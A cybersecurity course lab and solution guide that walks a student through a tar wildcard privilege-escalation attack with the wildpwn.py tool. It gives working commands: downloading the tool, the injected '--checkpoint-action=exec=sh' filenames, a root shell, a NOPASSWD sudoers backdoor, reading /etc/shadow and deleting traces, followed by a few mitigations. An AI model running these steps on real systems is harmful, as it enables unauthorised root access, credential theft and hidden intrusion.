Activity File: Exploiting the tar Command with the Checkpoint and Wildcard Options
In this exercise, you'll play the part of a penetration tester hunting for vulnerabilities in a target system's backup procedures.
You'll use the wildpwn.py tool to verify that the system's current configuration is indeed vulnerable to this kind of privilege escalation attack.
Then, you'll research and suggest two mitigation strategies to protect the server in the future.
Instructions
Using the following credentials, log in as jane and use sudo -l to verify that you have no sudo rights:
Username: jane
password: password
Next, we'll look for automated tar backup files that can be exploited.
As jane, navigate to your ~/Documents directory in the terminal. Are there any archive files present?
What might the name of the file indicate? Use ls -lat to check the ownership of the archive. Why wouldn't this file belong to jane?
Delete the archive file. You'll now need to wait a minute or two to test to see if the archive file comes back. If the archive file comes back, this means it can be potentially exploited with a wildcard attack.
Now that we've confirmed there is a regenerating archive file that is potentially backing up the contents of jane's Document directory, we'll continue with the following steps:
Downloading the wildpwn exploit tool.
Running it to create payloads.
Waiting for the automated tar backup system task also archives the malicious payload files, thus activating our exploit.
Note that there is a subdirectory, ExploitTar, that has been created for your pen-testing tasks. Use this folder to run wildpwn in.
Download the wildpwn.py attack tool to your ~/Documents/ExploitTar directory. Do this from the command line, not the browser.
Hint: Use wget or curl.
Navigate to and check the contents of this directory before we execute the python script.
Use wildpwn.py to generate the malicious tar payload files within the /home/jane/Documents/ExploitTar directory, which is expected to be frequently backed up.
Remember: The exploit becomes staged when the system's automated backup task archives Jane's documents into the tar file that we found earlier.
If you are unsure how to use this file: After downloading the script, run python wildpwn.py -h to look up usage. If you are stuck, ask your instructor or TA for the proper command.
Run ls to check the directory for our newly created files.
As the regular user jane, you just planted malicious files that will create the exploit file when they are automatically backed up by the system.
Now we wait.
After waiting a minute or two, re-run the ls command but with the proper options to see the new hidden subdirectory.
Navigate into that subdirectory and list its hidden file. This is the one you'll want to run to execute the wildcard attack exploit.
Time to run the exploit.
While still in the hidden subdirectory, execute the hidden file within the terminal.
What happened to your command prompt that confirms this exploit worked?
As root, make jane a superuser with sudo access.
Add jane to /etc/sudoers by running visudo. This will allow our user jane to run commands with superuser privileges. Also, specify the NOPASSWD rule for this user.
If you're not sure how to do this, there is a similar user setup under root's specifications.
Let's test our new privileges and then cover our tracks.
Log back in as jane and verify that you can run commands with sudo.
Then, remove the entire ExploitTar directory to cover your tracks.
Congratulations! You have successfully executed what is known as a tar wildcard attack! This is a more discreet attack that can be carried out on a Unix-based operating system with tar installed.
After verifying that you can escalate privileges and modify the system to catastrophic effect, identify two ways to prevent this attack in the future.



Solution Guide: Exploiting the tar Command with the Checkpoint and Wildcard Options
The goal of this activity is to act out the tar exploitation and research how to harden systems against this exploit.
Completing this activity required the following steps:
Downloading wildpwn.py using a non-sudo user account.
Running the script to generate .webscript.
Archiving the directory with tar to run the exploit.
Verifying that your user can gain sudo access.
Researching mitigation techniques.
Solutions
In your virtual machine, switch to the user jane, and verify that you have no sudo privileges:
Run su jane. Use password as the password.
Run sudo -l to confirm that you do not have superuser privileges.
Next, we'll look for automated tar backup files that can be exploited.
As jane, run cd ~/Documents.
Run ls -l to display the archive file, jane_docs_backup.tar.

-rw-r--r-- 1 root root 286720 Apr 28 18:36 jane_docs_backup.tar
Download the wildpwn.py attack tool to your ~/Documents/ExploitTar directory:
cd ~/Documents/ExploitTar
wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py
Check the contents of the directory before running the script with ls -lat:

total 16
drwxr-xr-x 3 jane jane 4096 Apr 28 18:40  .
drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f7
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f6
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f5
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f4
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f3
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f2
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f10
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f1
Use wildpwn.py to generate the malicious files by running:
python wildpwn.py tar within the ExploitTar directory.
The output will display:

[!] Selected payload: tar
[+] Done! Now wait for something like: tar cf archive.tar * on ./. Good luck!
Run ls -lat to display our new payload files:

total 20
drwxr-xr-x 3 jane jane 4096 Apr 28 18:41  .
-rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint=1'
-rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint-action=exec=sh .webscript'
-rw-rw-r-- 1 jane jane  535 Apr 28 18:41  .webscript
drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
...
...
After waiting 1â€“2 minutes, we can re-run ls -lat to display that the contents of the directory have changed!
Run ls -lat to display:

total 20
drwxr-xr-x 4 jane jane 4096 Apr 28 18:42  .
drwxr-xr-x 2 root root 4096 Apr 28 18:42  .cache
drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
-rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
-rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
Our exploit file should exist inside of a newly created .cache directory, with the name .cachefile.
Run cd .cache to navigate into the .cache directory.
Run ls -lat to display the hidden .cachefile exploit file.
-l displays a long-list format of the files.
-a displays entries starting with a ..
-t sorts by time modified, which we want due to the nature of this exploit.
While still in the .cache subdirectory, execute the .cachefile within the terminal:
Run ./.cachefile.
You'll see your user prompt change from jane:$ to root:#!
Add jane to /etc/sudoers so that we'll be able to run any command with superuser privileges root:
As root, run visudo and navigate to the following section of the file:

# User privilege specification
root    ALL=(ALL:ALL) ALL
Under that root permission, add the following line and save the file:

jane   ALL=(ALL) NOPASSWD:ALL

This should allow us to run sudo commands as jane without having to enter a password.
Log back in as jane and verify that you can run commands with sudo.
Run su jane.
Test your sudo permissions with:
sudo -l; and then
sudo cat /etc/shadow.
If you can see the contents of this file, you have successfully carried out a tar wildcard attack, turning jane into a superuser!
Due to how you edited the preceding visudo entry, you shouldn't need to enter your password for this command. Password-less sudo permissions allow attackers to rapidly execute elevated instructions on a target machine.
Remove the ExploitTar directory entirely to cover your tracks.
Run rm -r ~/Documents/ExploitTar.
Ways to prevent this attack in the future include:
Preventing users from downloading files from untrusted sources. This will involve enforcing stricter permissions on where users can save files.
Using a tool like tripwire to watch the file system for suspicious changes. This will alert you whenever a user downloaded files like wildpwn.py, or when backups create files like .cache/.cachefile.
Use a tool like lynis to scan the system for security vulnerabilities on a regular basis. This will make it more likely that you will identify malicious files before they have a chance to damage the system.
If you would like to read more about wildcard attacks, see the following resources:
Back To The Future: Unix Wildcards Gone Wild
wildpwn's GitHub page





